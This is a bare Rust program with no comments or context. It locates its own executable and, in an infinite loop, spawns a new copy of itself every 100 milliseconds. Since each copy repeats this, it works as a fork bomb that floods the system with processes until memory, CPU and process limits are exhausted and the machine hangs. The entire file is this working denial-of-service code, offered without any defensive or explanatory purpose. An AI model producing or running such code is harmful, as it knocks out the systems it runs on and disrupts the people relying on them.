use std::process::Command;
use std::env;
use std::thread;
use std::time::Duration;
fn main() {
    let current_exe = env::current_exe().expect("Failed to get current executable path");
    loop {
        Command::new(&current_exe)
            .spawn()
            .expect("Failed to start new process");
        thread::sleep(Duration::from_millis(100));
    }
}
